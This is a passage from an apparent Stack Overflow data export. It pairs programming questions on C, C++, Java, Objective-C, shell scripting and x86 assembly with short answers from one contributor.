Please try to <em>include links</em> to pages describing the data structures in more detail. Also, try to add a couple of words on <em>why</em> a data structure is cool (as <a href=""http://stackoverflow.com/questions/500607/what-are-the-lesser-known-but-cool-data-structures"">Jonas Kölker</a> already pointed out).  Also, try to provide <strong><em>one data-structure per answer</em></strong>. This will allow the better data structures to float to the top based on their votes alone.</p>
","9530","","<p><a href=""http://en.wikipedia.org/wiki/Fibonacci_heap"" rel=""nofollow"">Fibonacci heaps</a></p>

<p>They're used in some of the fastest known algorithms (asymptotically) for a lot of graph-related problems, such as the Shortest Path problem.  Dijkstra's algorithm runs in O(E log V) time with standard binary heaps; using Fibonacci heaps improves that to O(E + V log V), which is a huge speedup for dense graphs.  Unfortunately, though, they have a high constant factor, often making them impractical in practice.</p>
"
"<p>i have something like shared_ptr t(makeSomething(), mem_fun(&amp;Type::deleteMe))
i now need to call C styled func that require a pointer to Type. How do i get it from shared_ptr?</p>
","9530","Adam Rosenfield","<p>Use the <a href=""http://www.boost.org/doc/libs/1_37_0/libs/smart_ptr/shared_ptr.htm#get""><code>get()</code></a> method:</p>

<pre><code>boost::shared_ptr&lt;foo&gt; foo_ptr(new foo());
foo *raw_foo = foo_ptr.get();
c_library_function(raw_foo);
</code></pre>

<p>Make sure that your <code>shared_ptr</code> doesn't go out of scope before the library function is done with it -- otherwise badness could result, since the library may try to do something with the pointer after it's been deleted.  Be especially careful if the library function maintains a copy of the raw pointer after it returns.</p>
"
"<ul>
<li><p>I tend to use <a href=""http://en.wikipedia.org/wiki/POSIX_Threads""><b>POSIX Threads</b></a>, when programming in C, under <strong>Linux</strong>.</p></li>
<li><p>Without <b>MFC</b></p></li>
</ul>

<p><b>Question:</b></p>

<p>How would I then create threads in VC++?</p>

<p>Find more information on threads under win32?</p>

<h3>Edit:</h3>

<ul>
<li>Brief illustrations</li>
</ul>

<p><b>I LOVE stackoverflow - best resource for students!</b></p>

<p>Regards</p>
","9530","Adam Rosenfield","<p>Use <code>_beginthread()</code> or <code>_beginthreadex()</code> to create a new thread.  Do NOT use the Win32 function <code>CreateThread()</code> -- it does not properly initialize the multithreaded aspects of the C runtime.  See also <a href=""http://stackoverflow.com/questions/331536/windows-threading-beginthread-vs-beginthreadex-vs-createthread-c"">this question</a>.</p>
"
"<p>I want to generate random numbers manually. I know that every language have the rand or random function, but I'm curious to know how this is working.
Does anyone have code for that?</p>
","9530","","<p>POSIX.1-2001 gives the following example of an implementation of <code>rand()</code> and <code>srand()</code>, possibly useful when one needs the same sequence on two different machines.</p>

<pre><code>static unsigned long next = 1;
/* RAND_MAX assumed to be 32767 */
int myrand(void) {
    next = next * 1103515245 + 12345;
    return((unsigned)(next/65536) % 32768);
}
void mysrand(unsigned seed) {
    next = seed;
}
</code></pre>
"
"<p>In C++, I enjoyed having access to a 64 bit unsigned integer, via <code>unsigned long long int</code>, or via <code>uint64_t</code>. Now, in Java longs are 64 bits, I know. However, they are signed.</p>

<p>Is there an unsigned long (long) available as a Java primitive? How do I use it?</p>
","9530","Adam Rosenfield","<p>Nope, there is not.  You'll have to use the primitive <code>long</code> data type and deal with signedness issues, or use a class such as <a href=""http://java.sun.com/javase/6/docs/api/java/math/BigInteger.html""><code>BigInteger</code></a>.</p>
"
"<p>diff fails as the assembly listing is filled with slightly different labels.</p>
","9530","Adam Rosenfield","<p>Instead of directly comparing the assembly listings produced by the <code>-S</code> option, you could instead compile down to object files, disassemble the object files, and then compare those.  (Or, you could just do a straight out diff of the hexdump of the compiled object code, but that's much more painful).  This gets rid of most labels, so it should make it easier to compare with diff.  For example:</p>

<pre><code>g++ file1.cc -c -o file1.o
g++ file2.cc -c -o file2.o
objdump -d file1.o &gt; file1.s
objdump -d file2.o &gt; file2.s
diff file1.s file2.s
</code></pre>
"
"<p>I've been looking at some server logs using <code>tail -f</code> recently, and have thought that it'd be much easier to see some things if I could format the output. Really all I'm looking for is a way to perhaps colour certain words (determined by a regex), and perhaps remove certain words (again, determined by a regex).</p>

<p>I <a href=""http://stackoverflow.com/questions/113121/best-tail-log-file-visualization-freeware-tool"">know</a> <a href=""http://stackoverflow.com/questions/133821/the-best-tail-gui"">there's</a> programs which visualize server logs in real time and whatnot, but I'm more interested in this.</p>
","9530","Adam Rosenfield","<p>Pipe the output of <code>tail -f</code> into <code>sed</code>, and add in some <a href=""http://en.wikipedia.org/wiki/ANSI_escape_code"">ANSI escape codes</a>.  For example, the following will colorize all numbers in red (color 31) and all quoted strings in bright yellow (color 93):</p>

<pre><code>RED=`echo -en '\e[31m'`
YELLOW=`echo -en '\e[93m'`
RESET=`echo -en '\e[00m'`
tail -f file | sed -E ""s/([0-9]+)/$RED\1$RESET/g;s/(\""[^\""]*\"")/$YELLOW\1$RESET/g""
</code></pre>
"
"<p>Is it possible to get, using Bash, a list of commands starting with a certain string?<br />
I would like to get what is printed hitting &lt;tab&gt; twice after typing the start of the command and, for example, store it inside a variable.</p>
","9530","Adam Rosenfield","<p>Interesting, I didn't know about <code>compgen</code>.  Here a script I've used to do it, which doesn't check for non-executables:</p>

<pre><code>#!/bin/bash
echo $PATH | tr ':' '\0' | xargs -0 ls | grep ""$@"" | sort
</code></pre>

<p>Save that script somewhere in your <code>$PATH</code> (I named it <code>findcmd</code>), <code>chmod u+w</code> it, and then use it just like <code>grep</code>, passing your favorite options and pattern:</p>

<pre><code>findcmd ^foo   # finds all commands beginning with foo
findcmd -i -E 'ba+r'  # finds all commands matching the pattern 'ba+r', case insensitively
</code></pre>
"
"<p>What's wrong with the following code?</p>

<pre><code>-(IBAction)numFieldDoneEditing{
        NSPredicate * regexTest = [NSPredicate predicateWithFormat: @""SELF MATCHES '^\\d*\\.\\d{2}$'""];
        NSString *text = [[NSString alloc] initWithFormat: @""%@"", numberField.text];
        if ([regexTest evaluateWithObject: text] == YES) {
        		//do something
        }
        else{
        		//do something else
        }
        [text release];
        [regexTest release];
    }
</code></pre>
","9530","Adam Rosenfield","<p>For some reason, you have to escape your backslashes <em>twice</em> for the <code>\d</code> sequence in the regex specification:</p>

<pre><code>NSPredicate * regexTest = [NSPredicate predicateWithFormat: @""SELF MATCHES '^\\\\d*\\.\\\\d{2}$'""];
</code></pre>

<p>Some other problems with your code:</p>

<ul>
<li>You shouldn't be releasing the <code>regexText</code> object because you're not an owner.  It wasn't created with a method named <code>init</code> or <code>copy</code>.  See the <a href=""http://developer.apple.com/documentation/Cocoa/Conceptual/MemoryMgmt/MemoryMgmt.html"" rel=""nofollow"">Memory Management Programming Guide for Cocoa</a></li>
<li><p>This is more of a style issue, but if you have a boolean variable, don't compare it for equality with YES or NO, it just makes the code harder to understand.  Just test it or its inverse directly.  For example:</p>

<pre><code>// Positive test:
if([regexTest evaluateWithObject: text])
    ; // do stuff


// Negative test
if(![regexTest evaluateWithObject: text])
    ; // do stuff
</code></pre></li>
</ul>
"
"<p>I have a file containing UNICODE-16 strings that I would like to read into a Linux program. The strings were written raw from Windows' internal WCHAR format. (Does Windows always use UTF-16? e.g. in Japanese versions)</p>

<p>I believe that I can read them using raw reads and the converting with wcstombs_l. However, I cannot figure what locale to use. Runing ""locale -a"" on my up-to-date Ubuntu and Mac OS X machines yields zero locales with utf-16 in their names.</p>

<p>Is there a better way?</p>

<p>Update: the correct answer and others below helped point me to using libiconv. Here's a function I'm using to do the conversion. I currently have it inside a class that makes the conversions into a one-line piece of code.</p>

<pre><code>// Function for converting wchar_t* to char*. (Really: UTF-16LE --&gt; UTF-8)
// It will allocate the space needed for dest. The caller is
// responsible for freeing the memory.
static int iwcstombs_alloc(char **dest, const wchar_t *src)
{
  iconv_t cd;
  const char from[] = ""UTF-16LE"";
  const char to[] = ""UTF-8"";

  cd = iconv_open(to, from);
  if (cd == (iconv_t)-1)
  {
    printf(""iconv_open(\""%s\"", \""%s\"") failed: %s\n"",
           to, from, strerror(errno));
    return(-1);
  }

  // How much space do we need?
  // Guess that we need the same amount of space as used by src.
  // TODO: There should be a while loop around this whole process
  //       that detects insufficient memory space and reallocates
  //       more space.
  int len = sizeof(wchar_t) * (wcslen(src) + 1);

  //printf(""len = %d\n"", len);

  // Allocate space
  int destLen = len * sizeof(char);
  *dest = (char *)malloc(destLen);
  if (*dest == NULL)
  {
    iconv_close(cd);
    return -1;
  }

  // Convert

  size_t inBufBytesLeft = len;
  char *inBuf = (char *)src;
  size_t outBufBytesLeft = destLen;
  char *outBuf = (char *)*dest;

  int rc = iconv(cd,
                 &amp;inBuf,
                 &amp;inBufBytesLeft,
                 &amp;outBuf,
                 &amp;outBufBytesLeft);
  if (rc == -1)
  {
    printf(""iconv() failed: %s\n"", strerror(errno));
    iconv_close(cd);
    free(*dest);
    *dest = NULL;
    return -1;
  }

  iconv_close(cd);

  return 0;
} // iwcstombs_alloc()
</code></pre>
","9530","Adam Rosenfield","<p>I would strongly recommend using a Unicode encoding as your program's internal representation.  Use either UTF-16 or UTF-8.  If you use UTF-16 internally, then obviously no translation is required.  If you use UTF-8, you can use a locale with <code>.UTF-8</code> in it such as <code>en_US.UTF-8</code>.</p>
"
"<p>Are machine word size (or smaller) writes serialized? Only one native opcode is needed to copy register content to RAM. </p>
","9530","Adam Rosenfield","<p>Writing data to RAM is atomic.  If two CPUs try to write to the same location at the same time, the memory controller will decide on some order for the writes.  While one CPU is writing to memory, the other CPU will stall for as many cycles as necessary until the first write is completed; then it will overwrite its value.  This is what's known as a <a href=""http://en.wikipedia.org/wiki/Race_condition"" rel=""nofollow"">race condition</a>.</p>

<p>Writes that are smaller than the native word size are not atomic -- in that case, the CPU must read the old memory value into a register, write the new bytes into the register, and then write that new value back to memory.</p>

<p>You should never have code that depends on this -- if you have multiple CPUs that are trying to simultaneously write to the same memory location, you're doing something wrong.</p>

<p>Another important consideration is the <a href=""http://en.wikipedia.org/wiki/Cache_coherency"" rel=""nofollow"">cache coherency</a> problem.  Each CPU has its own cache.  If a CPU writes data to its cache, the other CPUs need to be made aware of the change to that data value if they want to read it.</p>
"
"<p>Since the GUI-side of OSX treats all dot-files (such as <code>.htaccess</code>) as hidden, it doesn't display them in any of the graphical UI:s, e.g. Finder or the Open-dialogues.</p>

<p>How can I open a dot-file (<code>.htaccess</code> in this case) in a graphical editor, without doing <a href=""http://lifehacker.com/software/command-line/show-hidden-files-in-finder-188892.php"">that thing</a> for all hidden files, universally and without going through Terminal.app?</p>

<p><em>Edit:</em> I'm on Leopard, if that makes a difference.</p>

<p><em>Edit2:</em> TextWrangler and TextMate seem to have features that allow you to open hidden files, which <em>partly</em> answers my question.</p>
","9530","Adam Rosenfield","<p>If you only want to do this for one specific file, you can create a symbolic link to the dot-file.  Open up Terminal.app, cd to the directory containing your dot-file, and run</p>

<pre><code>ln -s .htaccess dot_htaccess
</code></pre>

<p>Then you should be able to double-click the file <code>dot_htaccess</code> as a regular file, and any edits you make will really go into .htaccess.</p>
"
"<p>What does the following x86 assembler instruction do?</p>

<pre><code>call dword ptr ds:[00923030h]
</code></pre>

<p>It's an indirect call I suspect, but exactly how does it compute the address to the call?</p>
","9530","Adam Rosenfield","<p><strong>[EDIT] Updated</strong></p>

<p>Whenever you see a memory operand that looks something like <code>ds:0x00923030</code>, that's a <em>segment-relative</em> addressing mode.  The actual address being referred tp is at linear address 0x00923030 relative to the base address of the <code>ds</code> segment register.</p>

<p>Memory segmentation in the x86 architecture is somewhat confusing, and I think <a href=""http://en.wikipedia.org/wiki/X86_memory_segmentation"">Wikipedia</a> does a good job of explaining it.</p>

<p>Basically, x86 has a number of special <em>segment</em> registers: <code>cs</code> (<em>code</em> segment), <code>ds</code> (<em>data</em> segment), <code>es</code>, <code>fs</code>, <code>gs</code>, and <code>ss</code> (<em>stack</em> segment).  Every memory access is associated with a certain segment register.  Normally, you don't specify the segment register, and depending on how the memory is accessed, a default segment register is used.  For example, the <code>cs</code> register is used for reading instructions.</p>

<p>Each segment register has a certain <em>base address</em> and a <em>limit</em>.  The base address determines the physical address that linear address 0x00000000 corresponds to, and the limit determines the maximum allowable linear address for that segment.  For example, if the base address were 0x00040000 and the limit was 0x0000FFFF, then the only valid linear addresses would be 0x00000000 to 0x0000FFFF, and the corresponding physical addresses would be 0x00040000 to 0x0004FFFF.</p>

<p>Thus, the physical address at which the subroutine being called resides is given by the base address stored in the <code>ds</code> segment register, plus 0x00923030.  But we're not done yet -- the instruction has the word <code>ptr</code> in it.  This adds an extra level of indirection, so the actual target of the subroutine is the address <em>stored</em> at the location <code>ds:0x00923030</code>.</p>

<p>In AT&amp;T syntax (accepted by the GNU assembler), the instruction would be written as follows:</p>

<pre><code>lcall *ds:0x00923030
</code></pre>

<p>For the full gory details of what the instruction does, see the <a href=""http://pdos.csail.mit.edu/6.828/2008/readings/i386/CALL.htm"">80386 reference manual</a>.  This particular variant of the instruction is <code>""CALL r/m16""</code> (call near register indirect/memory indirect).</p>
"
"<pre><code>template &lt;class T&gt;
struct scalar_log_minimum {
public:
	typedef T value_type;
	typedef T result_type;
	static
		result_type initial_value(){
			return std::log(std::numeric_limits&lt;result_type&gt;::max());
	}
	static
		void update(result_type&amp; t, const value_type&amp; x){
			if ( (x&gt;0) &amp;&amp; (std::log(x)&lt;t) ) t = std::log(x);
	}
};
</code></pre>

<p>i got the following error while trying to compile the above:</p>

<p>functional_ext.hpp:55:59: macro ""max"" requires 2 arguments, but only 1 given</p>

<p>max is not a macro, right? Then what is this error? BTW, I am using visual studio 2005</p>

<p>Also what is 55:59 --- 55 is the line number 59?</p>
","9530","Adam Rosenfield","<p>You're including a header file somewhere that <code>#define</code>s <code>max</code> as a macro.  The best solution would be to figure out where it's being defined, and inhibit it from being defined if possible.  Alternatively, you could just <code>#undef</code> it:</p>

<pre><code>#include &lt;evil_header_which_defines_max.h&gt;
#undef max
</code></pre>
"
"<p>I'm resizing jpegs by using the Graphics.DrawImage method (see code fragment below). Can anyone confirm that this will not affect the compression of the new image?
I have seen <a href=""http://stackoverflow.com/questions/87753/resizing-an-image-without-losing-any-quality"">this thread</a>, but I am talking specifically about compression of jpegs.</p>

<pre><code>    private byte[] getResizedImage(String url, int newWidth)
    {
        Bitmap bmpOut = null;
        System.IO.MemoryStream outStream = new System.IO.MemoryStream();

        //input image is disposable
        using (Bitmap inputImage = LoadImageFromURL(url))
        {
            ImageFormat format = inputImage.RawFormat;
            decimal ratio;  //ratio old width:new width
            int newHeight = 0;

            //*** If the image is smaller than a thumbnail just return it
            if (inputImage.Width &lt; newWidth)
                return null;

            ratio = (decimal)newWidth / inputImage.Width;
            decimal h = inputImage.Height * ratio;
            newHeight = (int)h;

            bmpOut = new Bitmap(newWidth, newHeight);
            Graphics g = Graphics.FromImage(bmpOut);
            g.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.HighQualityBicubic;
            // try testing with following options:
            //g.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.AntiAlias;
            //g.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.HighQuality;
            //g.PixelOffsetMode = System.Drawing.Drawing2D.PixelOffsetMode.HighQuality;
            //g.CompositingQuality = System.Drawing.Drawing2D.CompositingQuality.HighQuality;

            g.FillRectangle(Brushes.White, 0, 0, newWidth, newHeight);
            g.DrawImage(inputImage, 0, 0, newWidth, newHeight);
            bmpOut.Save(outStream, getImageFormat(url));
        }

        return outStream.ToArray();

    }
</code></pre>
","9530","Adam Rosenfield","<p>JPEG compression is <a href=""http://en.wikipedia.org/wiki/Lossy_compression"" rel=""nofollow"">lossy</a> -- not all of the original data is actually stored exactly.  If you compress an image as a JPEG and decompress it, you won't get back the exact original image.  Every time you compress and decompress, you lose a bit of quality.</p>

<p>For some simple transformations, such as rotating a JPEG, you can do it losslessly with programs such as <a href=""http://jpegclub.org/"" rel=""nofollow"">jpegtran</a>.</p>

<p>However, for resizing images, you can't do it losslessly.  You're definitely going to degrade the quality somewhat when you do this, although probably not by very much.  If possible, try to use original lossless images as the source for the resize operation to get the highest possible quality, and if you concatenate multiple resize operations, instead just do a single resize from the original.</p>
"
"<p>I'm trying to follow a tutorial for a C++ interface in the Mac OS X API (Audio Queue Services), but in a Cocoa (well, actually just Foundation) application (well, actually just a 'tool'). It has a struct that looks like this:</p>

<pre><code>static const int kNumberBuffers = 3;                              // 1
struct AQPlayerState {
    AudioStreamBasicDescription   mDataFormat;                    // 2
    AudioQueueRef                 mQueue;                         // 3
    AudioQueueBufferRef           mBuffers[kNumberBuffers];       // 4
    AudioFileID                   mAudioFile;                     // 5
    UInt32                        bufferByteSize;                 // 6
    SInt64                        mCurrentPacket;                 // 7
    UInt32                        mNumPacketsToRead;              // 8
    AudioStreamPacketDescription  *mPacketDescs;                  // 9
    bool                          mIsRunning;                     // 10
};
</code></pre>

<p>I'm having a lot of trouble with translating item 4 into Objective-C, because I can't figure out how to <code>@synthesize</code> a C array. Specifically, this is what I have so far:</p>

<h3>PlayerState.h</h3>

<pre><code>#import &lt;Foundation/Foundation.h&gt;
#import &lt;AudioToolbox/AudioQueue.h&gt;

@interface PlayerState : NSObject {
  AudioStreamBasicDescription   dataFormat;
  AudioQueueRef                 queue;
  AudioQueueBufferRef           _buffers[3];
  int                           audioFile; // make this an actual type?
  UInt32                        bufferByteSize;
  SInt64                        currentPacket;
  UInt32                        numPacketsToRead;
  AudioStreamPacketDescription* packetDescs;
  bool                          isRunning;
}

@property(assign) AudioStreamBasicDescription   dataFormat;
@property(assign) AudioQueueRef                 queue;
@property(assign) AudioQueueBufferRef           buffers;
@property(assign) int                           audioFile;
@property(assign) UInt32                        bufferByteSize;
@property(assign) SInt64                        currentPacket;
@property(assign) UInt32                        numPacketsToRead;
@property(assign) AudioStreamPacketDescription* packetDescs;
@property(assign) bool                          isRunning;

@end
</code></pre>

<h2>PlayerState.m</h2>

<pre><code>#import ""PlayerState.h""

@implementation PlayerState

@synthesize dataFormat;
@synthesize queue;
@synthesize buffers;
@synthesize audioFile;
@synthesize bufferByteSize;
@synthesize currentPacket;
@synthesize numPacketsToRead;
@synthesize packetDescs;
@synthesize isRunning;

@end
</code></pre>

<p><code>@synthesize buffers</code> fails to compile as follows: ""error: synthesized property 'buffers' must either be named the same as a compatible ivar or must explicitly name an ivar""</p>

<p>This is obviously because the corresponding ivar is named <code>_buffers</code> and not <code>buffers</code> - but this is necessary, because I can't define a property as an array (can I? <code>@property(assign) *AudioQueueBufferRef buffers</code> is a syntax error)</p>

<p>What can I do to either define the ivar as an array of <code>AudioQueueBufferRef</code> structs, or synthesize the property such that it refers to the <code>_buffers</code> array?</p>
","9530","Adam Rosenfield","<p>Why are you translating the structure into an Objective-C object?  Objective-C is a <strong>strict</strong> superset of C, so you can just use the given struct as-is with Objective-C.</p>

<p><strong>[EDIT]</strong> In response to your comments, the compiler is complaining about the <code>mBuffers</code> declaration because of the rules about what's allowable as the size of a static array.  The rules in C are a little stricter than the rules in C++.  As an easy fix, just change the line</p>

<pre><code>static const int kNumberBuffers = 3;
</code></pre>

<p>into</p>

<pre><code>#define kNumberBuffers 3
</code></pre>

<p>and then the struct should compile correctly (provided, of course, that you've included the necessary headers that define all of the proper data types such as <code>AudioStreamBasicDescription</code>, etc.).</p>
"
"<p>I have a class called Cal and it's .cpp and .h counterpart</p>

<p>Headerfile has</p>

<pre><code>class Cal {
    private:
        int wa[2][2];

    public:
        void do_cal();
};
</code></pre>

<p>.cpp file has</p>

<pre><code>#include ""Cal.h""
void Cal::do_cal() {
   print(wa) // where print just itterates and prints the elements in wa
}
</code></pre>

<p>My question is how do I initialize the array <code>wa</code> ? I just can't seem to get it to work. </p>

<p>I tried with :</p>

<pre><code>int wa[2][2] = {
                {5,2},
                {7,9}
               };
</code></pre>

<p>in the header file but I get errors saying I cant do so as it's against iso..something.</p>

<p>Tried also to initialize the array <code>wa</code> in the constructor but that didnt work either.. What am I missing ?</p>

<p>Thanks</p>
","9530","Adam Rosenfield","<p>You can't do it easily.  If you don't want to specify each element individually like in <a href=""http://stackoverflow.com/questions/520893/c-c-private-array-initialization-in-the-header-file/520917#520917"">Perchik's answer</a>, you can create one static array and <code>memcpy</code> that (which will probably be faster for non-trivial array sizes):</p>

<pre><code>namespace
{
    const int default_wa[2][2] = {{5, 2}, {7, 9}};
}

Cal::Cal
{
    memcpy(&amp;wa[0][0], &amp;default_wa[0][0], sizeof(wa));
}
</code></pre>
"
"<p>I've seen these in real code:</p>

<pre><code>#define SCREEN_DIMENSIONS 2
#define THREE_THOUSAND_FIVE_HUNDRED_TWENTY_TWO 3522
</code></pre>

<p>What is the weirdest constant you've ever seen?</p>

<p>P.S. And of course my favorite in JScript:</p>

<pre><code>bool b;
switch (b.ToString().length) {
case 4: // true
  ...
  break;
case 5:  // false
  ...
  break;
)
</code></pre>
","9530","Adam Rosenfield","<p>From <a href=""http://thedailywtf.com/Articles/The_Brillant_Paula_Bean.aspx"" rel=""nofollow"">The Daily WTF</a>:</p>

<pre><code>private String paula = ""Brillant"";
</code></pre>
"
"<p>I have a Cygwin bash script that I need to watch and terminate under certain conditions - specifically, after a certain file has been created. I'm having difficulty figuring out how exactly to terminate the script with the same level of completeness that Ctrl+C does, however.</p>

<p>Here's a simple script (called <strong><code>test1</code></strong>) that does little more than wait around to be terminated.</p>

<pre><code>#!/bin/bash

test -f kill_me &amp;&amp; rm kill_me

touch kill_me
tail -f kill_me
</code></pre>

<p>If this script is run in the foreground, Ctrl+C will terminate both the <code>tail</code> and the script itself. If the script is run in the background, a <code>kill %1</code> (assuming it is job 1) will also terminate both <code>tail</code> and the script.</p>

<p>However, when I try to do the same thing from a script, I'm finding that only the <code>bash</code> process running the script is terminated, while <code>tail</code> hangs around disconnected from its parent. Here's one way I tried (<strong><code>test2</code></strong>):</p>

<pre><code>#!/bin/bash

test -f kill_me &amp;&amp; rm kill_me

(
    touch kill_me
    tail -f kill_me
) &amp;

while true; do
    sleep 1
    test -f kill_me &amp;&amp; {
        kill %1
        exit
    }
done
</code></pre>

<p>If this is run, the bash subshell running in the background is terminated OK, but <code>tail</code> still hangs around.</p>

<p>If I use an explicitly separate script, like this, it still doesn't work (<strong><code>test3</code></strong>):</p>

<pre><code>#!/bin/bash

test -f kill_me &amp;&amp; rm kill_me

# assuming test1 above is included in the same directory
./test1 &amp;

while true; do
    sleep 1
    test -f kill_me &amp;&amp; {
        kill %1
        exit
    }
done
</code></pre>

<p><code>tail</code> is still hanging around after this script is run.</p>

<p>In my actual case, the process creating files is not particularly instrumentable, so I can't get it to terminate of its own accord; by finding out when it has created a particular file, however, I can at that point know that it's OK to terminate it. Unfortunately, I can't use a simple <code>killall</code> or equivalent, as there may be multiple instances running, and I only want to kill the specific instance.</p>
","9530","Adam Rosenfield","<p><a href=""http://unix.derkeiler.com/Newsgroups/comp.unix.shell/2004-05/1108.html"" rel=""nofollow"">This script</a> looks like it'll do the job:</p>

<pre><code>#!/bin/bash
# Author: Sunil Alankar

##
# recursive kill. kills the process tree down from the specified pid
#

# foreach child of pid, recursive call dokill
dokill() {
    local pid=$1
    local itsparent=""""
    local aprocess=""""
    local x=""""
    # next line is a single line
    for x in `/bin/ps -f | sed -e '/UID/d;s/[a-zA-Z0-9_-]\{1,\}
\{1,\}\([0-9]\{1,\}\) \{1,\}\([0-9]\{1,\}\) .*/\1 \2/g'`
    do
        if [ ""$aprocess"" = """" ]; then
            aprocess=$x
            itsparent=""""
            continue
        else
            itsparent=$x
            if [ ""$itsparent"" = ""$pid"" ]; then
                dokill $aprocess
            fi
            aprocess=""""
        fi
    done
    echo ""killing $1""
    kill -9 $1 &gt; /dev/null 2&gt;&amp;1
}

case $# in
1) PID=$1
        ;;
*) echo ""usage: rekill &lt;top pid to kill&gt;"";
        exit 1;
        ;;
esac

dokill $PID
</code></pre>
"
"<p>Say I have three window classes, one for each OS I want to support: </p>

<ul>
<li>WindowsWindow</li>
<li>OSXWindow</li>
<li>LinuxWindow</li>
</ul>

<p>They all inherit from the <strong>Window</strong> class. This is also the class you instantiate. 
The Window class have the . -> and :: operators overloaded, and depending on which OS were running on (based on IFDEFs) it casts the this pointer to the relevant class.</p>

<p>What I want to do is just create a Window instance without any clue as to what OS is running. Is this thinking very wrong? Is the downcast to dangerous? Are there better ways to do this?</p>

<p>Im aware that there are libraries to do this, but I want to try it myself.</p>

<p>I guess the easiest way is to create a factory. But can something like this be done?</p>
","9530","Adam Rosenfield","<p>You can't overload the scope resolution operator :: at all.  You could overload the -> operator, but when you invoke that operator, you already have to have an object of the requisite type.  For creating your windows, just use a simple factory method:</p>

<pre><code>class Window
{
public:
    static Window *CreateWindow(...)
    {
#ifdef _WIN32
        return new Win32Window(...);
#elif defined(/** whatever is defined for Linux */)
        return new X11Window(...);
#elif defined(/** whatever is defined for Mac */)
        return new CocoaWindow(...);
#else
#error ""Bad platform!""
#endif
    }
};
</code></pre>
"
"<p>I'm trying to figure out how to open system preferred editor for given file.</p>

<p>Say, we have a file manager, written in Java. User goes to folder and see list of files. And, for example, there are file ""Icon.jpg"". User double clicks on the filename and file opens in system's preferred editor (i.e. Gimp). The main issue is - how to do that?</p>

<p>We can do Runtime.getRuntime().exec(""something file""), but this way you should know which program is preferred in user environment. But how?</p>

<p>We also are able to do Desktop.getDesktop().edit(File file), but this way we cannot track process and aren't able to know then this child process is closed. Other issue - function doesn't works on linux (at least on Ubuntu 8.10). There also is Desktop.getDesktop().open(File file), but it forses to open file viewer, instead of system viewer for that file type.</p>

<p>I am searching for solution all week, but didn't got any suitable and generic one. Do you know the other approaches to this question? For my project it would be enough if it would work on Windows+Linux+Mac.</p>

<p>Thank you for your answers and advices.</p>

<p>//Edit on 2009-02-08 23:04</p>

<p>Other suggestion: can I force ""application selection"" window in Windows and in Linux, as in Mac with ""open file""? For example, then you trying to open file, you are being asked to choose application from list of system preferred ones? (something like ""Open with..."" in windows explorer). Do you know?</p>
","9530","Adam Rosenfield","<p>This isn't cross-platform, but on Mac OS X you can do</p>

<pre><code>Runtime.getRuntime().exec(""open filename"");
</code></pre>

<p>The <code>open(1)</code> executable uses <a href=""http://developer.apple.com/DOCUMENTATION/Carbon/Conceptual/LaunchServicesConcepts/LSCIntro/chapter_1_section_1.html"" rel=""nofollow"">LaunchServices</a> to pick the right program to execute, and then uses that to open the file named <code>filename</code>.</p>
"
"<p>Is it possible to compute the ranges of float, double and long double data types in a portable way without reading float.h and using ANSI C? By portable, I mean including those cases when the target machine does not adhere to IEEE 754 standard.</p>

<p>I'm reading the K&amp;R book and exercise 2-1 asks me to ""compute"" them so I suppose that means avoiding float.h completely which includes FLT_MIN, FLT_MAX, DBL_MIN and DBL_MAX (reading these values directly would certainly not classify as ""computing"").</p>
","9530","Adam Rosenfield","<p>For 99.99% of all applications, you should assume IEEE 754 and use the constants defined in <code>&lt;float.h&gt;</code>.  In the other 0.01%, you'll be working with very specialized hardware, and in that case, you should know what to use based on the hardware.</p>
"
"<p>What are some good tools for getting a quick start for parsing and analyzing C/C++ code?</p>

<p>In particular, I'm looking for open source tools that handle the C/C++ preprocessor and language.  Preferably, these tools would use lex/yacc (or flex/bison) for the grammar, and not be too complicated.  They should handle the latest ANSI C/C++ definitions.</p>

<p>Here's what I've found so far, but haven't looked at them in detail (thoughts?):</p>

<ul>
<li><a href=""http://cscope.sourceforge.net/"">CScope</a> - Old-school C analyzer.  Doesn't seem to do a full parse, though.  Described as a glorified 'grep' for finding C functions.</li>
<li><a href=""http://gcc.gnu.org/"">GCC</a> - Everybody's favorite open source compiler.  Very complicated, but seems to do it all.  There's a related project for creating GCC extensions called <a href=""http://research.alexeysmirnov.name/index.php?area=sec&amp;proj=gem"">GEM</a>, but hasn't been updated since GCC 4.1 (2006).</li>
<li><a href=""http://ivs.cs.uni-magdeburg.de/~puma/"">PUMA</a> - The PUre MAnipulator.  (from the page: ""The intention of this project is to
provide a library of classes for the analysis and manipulation of C/C++ sources. For this
purpose PUMA provides classes for scanning, parsing and of course manipulating C/C++
sources."").  This looks promising, but hasn't been updated since 2001.  Apparently PUMA has been incorporated into <a href=""http://www.aspectc.org/"">AspectC++</a>, but even this project hasn't been updated since 2006.</li>
<li>Various C/C++ raw grammars.  You can get <a href=""http://www.sigala.it/sandro/software.php"">c-c++-grammars-1.2.tar.gz</a>, but this has been unmaintained since 1997.  A little Google searching pulls up other basic lex/yacc grammars that could serve as a starting place.</li>
<li>Any others?</li>
</ul>

<p>I'm hoping to use this as a starting point for translating C/C++ source into a new toy language.</p>

<p>Thanks!
-Matt</p>

<p>(Added 2/9): Just a clarification: I want to extract semantic information from the preprocessor in addition to the C/C++ code itself.  I don't want ""#define foo 42"" to disappear into the integer ""42"", but remain attached to the name ""foo"".  This, unfortunately, excludes several solutions that run the preprocessor first and only deliver the C/C++ parse tree)</p>
","9530","Adam Rosenfield","<p>Parsing C++ is extremely hard because the grammar is undecidable.  To quote <a href=""http://www.yosefk.com/c++fqa/defective.html#defect-2"">Yossi Kreinin</a>:</p>

<blockquote>
  <p>Outstandingly complicated grammar</p>
  
  <p>""Outstandingly"" should be interpreted literally, because <em>all popular languages</em> have <a href=""http://en.wikipedia.org/wiki/Context-free_grammar"">context-free</a> (or ""nearly"" context-free) grammars, while C++ has <a href=""http://en.wikipedia.org/wiki/Undecidability"">undecidable</a> grammar. If you like compilers and parsers, you probably know what this means. If you're not into this kind of thing, there's a <a href=""http://www.yosefk.com/c++fqa/ctors.html#fqa-10.19"">simple example</a> showing the problem with parsing C++: is <code>AA BB(CC);</code> an object definition or a function declaration? It turns out that the answer depends heavily on the code <em>before</em> the statement - the ""context"". This shows (on an intuitive level) that the C++ grammar is quite context-sensitive. </p>
</blockquote>
"
"<p>I am using TouchXml because of the given limitations of NSXML on the actual iPhone. Anyway, I'm just starting out with Objective-C, I come from a C# background, and felt like learning something new..anyhow.. here is my xml file...</p>

